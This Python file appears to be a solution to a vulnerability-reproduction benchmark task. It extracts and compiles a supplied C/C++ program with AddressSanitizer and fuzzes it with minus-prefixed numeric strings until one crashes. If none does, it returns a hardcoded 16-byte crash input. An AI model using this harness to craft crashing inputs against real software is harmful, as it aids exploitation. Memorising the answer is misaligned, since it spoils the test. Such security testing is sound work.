import os
import re
import tarfile
import tempfile
import subprocess
import random
from typing import Optional, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc: Optional[bytes] = None

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                # Extract the tarball
                try:
                    with tarfile.open(src_path, "r:*") as tar:
                        tar.extractall(tmpdir)
                except Exception:
                    # If extraction fails for any reason, fall back to static PoC
                    return b"-123456789012345"

                build_result = self._build_harness(tmpdir)
                if build_result is not None:
                    bin_path, has_asan = build_result
                    try:
                        poc = self._find_poc(bin_path, tmpdir, has_asan)
                    except Exception:
                        poc = None

        except Exception:
            poc = None

        if poc is not None:
            return poc

        # Fallback static PoC (16 bytes, leading minus sign)
        return b"-123456789012345"

    def _build_harness(self, src_root: str) -> Optional[Tuple[str, bool]]:
        main_candidates: List[Tuple[int, str]] = []

        # Find candidate C/C++ files containing main()
        for root, _, files in os.walk(src_root):
            for name in files:
                if not name.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(root, name)
                try:
                    with open(path, "r", errors="ignore") as f:
                        content = f.read()
                except Exception:
                    continue
                if "main(" in content:
                    score = 0
                    lname = name.lower()
                    if "llvmfuzzertestoneinput" in content:
                        score += 3
                    if "fuzz" in lname or "poc" in lname or "test" in lname:
                        score += 1
                    main_candidates.append((score, path))

        if not main_candidates:
            return None

        main_candidates.sort(key=lambda x: x[0], reverse=True)
        bin_path = os.path.join(src_root, "fuzz_target")

        for _, path in main_candidates:
            ext = os.path.splitext(path)[1].lower()
            if ext == ".c":
                compilers = ["clang", "gcc"]
            else:
                compilers = ["clang++", "g++"]

            for cc in compilers:
                # First try with ASan
                cmd_asan = [
                    cc,
                    "-g",
                    "-O1",
                    "-fno-omit-frame-pointer",
                    "-fsanitize=address",
                    path,
                    "-lm",
                    "-o",
                    bin_path,
                ]
                try:
                    res = subprocess.run(
                        cmd_asan,
                        cwd=src_root,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=120,
                    )
                    if res.returncode == 0 and os.path.exists(bin_path):
                        return bin_path, True
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass

                # Then without ASan, in case ASan isn't available
                cmd_no_asan = [
                    cc,
                    "-g",
                    "-O1",
                    path,
                    "-lm",
                    "-o",
                    bin_path,
                ]
                try:
                    res = subprocess.run(
                        cmd_no_asan,
                        cwd=src_root,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=120,
                    )
                    if res.returncode == 0 and os.path.exists(bin_path):
                        return bin_path, False
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    pass

        return None

    def _find_poc(self, bin_path: str, workdir: str, has_asan: bool) -> Optional[bytes]:
        candidates = self._generate_candidates()

        for data in candidates:
            try:
                if self._trigger_crash(bin_path, workdir, data, has_asan):
                    return data
            except Exception:
                # Ignore individual candidate failures and continue
                continue

        return None

    def _trigger_crash(
        self, bin_path: str, workdir: str, data: bytes, has_asan: bool
    ) -> bool:
        # Try feeding data via stdin
        try:
            proc = subprocess.run(
                [bin_path],
                input=data,
                cwd=workdir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                timeout=0.5,
            )
            if self._is_crash(proc, has_asan):
                return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

        # Try feeding data via a temporary file path argument
        tmp_file = None
        try:
            with tempfile.NamedTemporaryFile(dir=workdir, delete=False) as f:
                f.write(data)
                f.flush()
                tmp_file = f.name

            proc = subprocess.run(
                [bin_path, tmp_file],
                cwd=workdir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                timeout=0.5,
            )
            if self._is_crash(proc, has_asan):
                return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
        finally:
            if tmp_file is not None:
                try:
                    os.unlink(tmp_file)
                except OSError:
                    pass

        return False

    def _is_crash(self, proc: subprocess.CompletedProcess, has_asan: bool) -> bool:
        rc = proc.returncode
        if rc is None:
            return False

        # Negative return code usually means terminated by a signal (e.g., SIGSEGV)
        if rc < 0:
            return True

        stderr = proc.stderr or b""
        lower = stderr.lower()

        if b"addresssanitizer" in lower or b"asan" in lower:
            return True
        if b"ubsan" in lower or b"undefinedbehaviour" in lower or b"undefined behavior" in lower:
            return True
        if b"stack-buffer-overflow" in lower or b"heap-buffer-overflow" in lower:
            return True
        if not has_asan:
            if b"segmentation fault" in lower or b"stack smashing" in lower:
                return True

        return False

    def _generate_candidates(self) -> List[bytes]:
        seeds = [
            "-0",
            "-1",
            "-9",
            "-12345",
            "-0.0",
            "-1.0",
            "-.inf",
            "-inf",
            "-INF",
            "-infinity",
            "-INFINITY",
            "-Infinity",
            "-nan",
            "-NaN",
            "-NAN",
            "-0inf",
            "-0infinity",
            "--inf",
            "--infinity",
            "-inff",
            "-i",
            "-x",
            "-.",
        ]

        lengths = [16, 32, 64, 128, 256]
        candidates: List[bytes] = []

        # Deterministic expansions of seeds to multiple lengths
        for s in seeds:
            base = s.encode("ascii", errors="ignore")
            if not base:
                continue
            for L in lengths:
                if L <= len(base):
                    cand = base[:L]
                else:
                    pad_byte = base[-1:]
                    cand = base + pad_byte * (L - len(base))
                if cand and cand[0] != ord("-"):
                    cand = b"-" + cand[1:]
                candidates.append(cand)

        # Patterns: '-' followed by a repeated character
        pad_chars = b"0123456789infxyzabcde"
        for ch in pad_chars:
            for L in lengths:
                if L < 1:
                    continue
                cand = b"-" + bytes([ch]) * (L - 1)
                candidates.append(cand)

        # Some deterministic pseudo-random patterns, all starting with '-'
        random.seed(0)
        alphabet = b"-+0123456789eE.,infINFTYabcxyz"
        for _ in range(60):
            L = random.randint(8, 64)
            buf = bytearray()
            for _ in range(L):
                buf.append(random.choice(alphabet))
            if not buf:
                buf = bytearray(b"-")
            else:
                buf[0] = ord("-")
            candidates.append(bytes(buf))

        # Ensure uniqueness to avoid redundant runs
        # Keep order (Python 3.7+ dict preserves insertion order)
        unique_candidates: List[bytes] = []
        seen = set()
        for c in candidates:
            if c not in seen:
                seen.add(c)
                unique_candidates.append(c)

        return unique_candidates
